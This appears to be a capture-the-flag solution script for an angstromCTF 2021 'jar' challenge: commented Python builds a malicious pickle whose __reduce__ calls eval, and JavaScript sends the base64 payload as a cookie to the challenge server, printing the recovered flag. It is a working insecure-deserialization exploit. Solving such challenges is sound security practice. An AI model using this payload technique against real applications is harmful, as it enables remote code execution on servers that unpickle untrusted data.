/*
import requests
import pickle, base64

url = "https://jar.2021.chall.actf.co"
class exploit():
    def __reduce__(self):
            return (eval, ("{flag}", ))
print(base64.b64encode(pickle.dumps(exploit())))
# b'gANjYnVpbHRpbnMKZXZhbApxAFgGAAAAe2ZsYWd9cQGFcQJScQMu'
*/

const url = "https://jar.2021.chall.actf.co";

fetch(url, {
    method: 'POST',
    headers:{
        Cookie:'contents=gANjYnVpbHRpbnMKZXZhbApxAFgGAAAAe2ZsYWd9cQGFcQJScQMu'
        }
    }
).then((x) => x.text()).then((x) => console.log(x));

// Output : actf{you_got_yourself_out_of_a_pickle}
